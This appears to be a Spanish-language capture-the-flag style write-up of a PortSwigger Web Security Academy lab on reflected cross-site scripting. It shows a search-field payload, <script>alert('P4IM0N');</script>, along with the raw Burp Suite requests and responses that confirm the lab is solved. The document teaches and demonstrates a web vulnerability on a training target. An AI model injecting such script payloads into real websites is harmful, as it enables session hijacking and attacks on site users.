# 🎫 Laboratorio: XSS reflejado en contexto HTML sin nada codificado

## Laboratorio: XSS reflejado en contexto HTML sin nada codificado

APRENDIZ

LABORATORIONo resuelto

Esta práctica de laboratorio contiene una vulnerabilidad de secuencias de comandos entre sitios reflejada simple en la funcionalidad de búsqueda.

Para resolver la práctica de laboratorio, realice un ataque de secuencias de comandos entre sitios que llame a la `alert`función.



```python
// Some code

/////////////////////////////////////////////



Laboratorio: XSS reflejado en contexto HTML sin nada codificado



EXPLORAMOS LA PAGINA MANUALMENTE:


VEMOS QUE MUESTRA OTRO H1 SI LE INCORPORAMOS UNA ETIQUETA H1 CON SU CONTENIDO DE BUSQUEDA YA DANDONOS PAUTA DE UN XSS:



URL:

https://0ab8006804ef073183c79178009500aa.web-security-academy.net/?search=P4IM0N



BUSQUEDA NORMAL:

P4IM0N


BROWSER:


<section class="blog-header">
                        <h1>0 search results for 'P4IM0N'</h1>
                        <hr>
</section>






BUQUEDA:


<h1>P4IM0N</h1>



BROWSER:


<section class="blog-header">
                        <h1>0 search results for '</h1>
                        <h1>P4IM0N</h1>'
                        <hr>
</section>



PROBAMOS INYECTAR UN SCRIPT DE ALERT PARA EVR SI FUNCIONA Y BINGO:


<script>alert('P4IM0N');</script>


BROWSER:


NOS MUESTRA EL CARTEL DE ALERTA, SE TNZO:


P4IM0N


https://0ab8006804ef073183c79178009500aa.web-security-academy.net/?search=%3Cscript%3Ealert%28%27P4IM0N%27%29%3B%3C%2Fscript%3E



<section class="blog-header">
                        <h1>0 search results for '<script>alert('P4IM0N');</script>'</h1>
                        <hr>
</section>







USAMOS BURPSUITE:



REQUEST:


GET /generate_204 HTTP/1.1
Host: www.gstatic.com
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9,en;q=0.8
Connection: close





GET /?search=<h1>P4IM0N</h1> HTTP/1.1
Host: 0ab8006804ef073183c79178009500aa.web-security-academy.net
Cookie: session=KrpTSgu1BeJjCi0Kd9sdj6ZMsKPZrEIM
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ab8006804ef073183c79178009500aa.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9,en;q=0.8
Connection: close




RESPONSE:





HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 6267

<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsBlog.css rel=stylesheet>
        <title>Reflected XSS into HTML context with nothing encoded</title>
    </head>
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <div id="academyLabHeader">
            <section class='academyLabBanner is-solved'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Reflected XSS into HTML context with nothing encoded</h2>
                            <a class=link-back href='https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-solved'>
                            <span>LAB</span>
                            <p>Solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
            <section id=notification-labsolved class=notification-labsolved>
                <div class=container>
                    <h4>Congratulations, you solved the lab!</h4>
                    <div>
                        <span>
                            Share your skills!
                        </span>
                        <a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aReflected+XSS+into+HTML+context+with+nothing+encoded%0a%0a@WebSecAcademy%0a&url=https%3a%2f%2fportswigger.net%2fweb-security%2fcross-site-scripting%2freflected%2flab-html-context-nothing-encoded&related=WebSecAcademy,Burp_Suite'>
                    <svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'>
                        <title>twitter-button</title>
                        <path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'></path>
                    </svg>
                        </a>
                        <a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fcross-site-scripting%2freflected%2flab-html-context-nothing-encoded'>
                    <svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
                        <title>linkedin-button</title>
                        <path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/>
                    </svg>
                        </a>
                        <a href='https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded'>
                            Continue learning 
                            <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                <g>
                                    <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                    <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                </g>
                            </svg>
                        </a>
                    </div>
                </div>
            </section>
        </div>
        <div theme="blog">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class=blog-header>
                        <h1>0 search results for '<h1>P4IM0N</h1>'</h1>
                        <hr>
                    </section>
                    <section class=search>
                        <form action=/ method=GET>
                            <input type=text placeholder='Search the blog...' name=search>
                            <button type=submit class=button>Search</button>
                        </form>
                    </section>
                    <section class="blog-list no-results">
                        <div class=is-linkback>
        <a href="/">Back to Blog</a>
                        </div>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>






AHORA PROBAMOS CON EL SCRIPT ALERT:




REQUEST:



GET /?search=<script>alert('P4IM0N');</script> HTTP/2
Host: 0ab8006804ef073183c79178009500aa.web-security-academy.net
Cookie: session=KrpTSgu1BeJjCi0Kd9sdj6ZMsKPZrEIM
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ab8006804ef073183c79178009500aa.web-security-academy.net/?search=century
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9,en;q=0.8







RESPONSE:



HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 6285

<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsBlog.css rel=stylesheet>
        <title>Reflected XSS into HTML context with nothing encoded</title>
    </head>
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <div id="academyLabHeader">
            <section class='academyLabBanner is-solved'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Reflected XSS into HTML context with nothing encoded</h2>
                            <a class=link-back href='https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-solved'>
                            <span>LAB</span>
                            <p>Solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
            <section id=notification-labsolved class=notification-labsolved>
                <div class=container>
                    <h4>Congratulations, you solved the lab!</h4>
                    <div>
                        <span>
                            Share your skills!
                        </span>
                        <a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aReflected+XSS+into+HTML+context+with+nothing+encoded%0a%0a@WebSecAcademy%0a&url=https%3a%2f%2fportswigger.net%2fweb-security%2fcross-site-scripting%2freflected%2flab-html-context-nothing-encoded&related=WebSecAcademy,Burp_Suite'>
                    <svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'>
                        <title>twitter-button</title>
                        <path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'></path>
                    </svg>
                        </a>
                        <a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fcross-site-scripting%2freflected%2flab-html-context-nothing-encoded'>
                    <svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
                        <title>linkedin-button</title>
                        <path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/>
                    </svg>
                        </a>
                        <a href='https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded'>
                            Continue learning 
                            <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                <g>
                                    <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                    <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                </g>
                            </svg>
                        </a>
                    </div>
                </div>
            </section>
        </div>
        <div theme="blog">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class=blog-header>
                        <h1>0 search results for '<script>alert('P4IM0N');</script>'</h1>
                        <hr>
                    </section>
                    <section class=search>
                        <form action=/ method=GET>
                            <input type=text placeholder='Search the blog...' name=search>
                            <button type=submit class=button>Search</button>
                        </form>
                    </section>
                    <section class="blog-list no-results">
                        <div class=is-linkback>
        <a href="/">Back to Blog</a>
                        </div>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>

```

[\
](https://portswigger.net/academy/labs/launch/9e3414ee887ebaed9f7ed25b58dd639959bb28a3b926f53c831c1d86e03d8813?referrer=%2fweb-security%2fcross-site-scripting%2freflected%2flab-html-context-nothing-encoded)
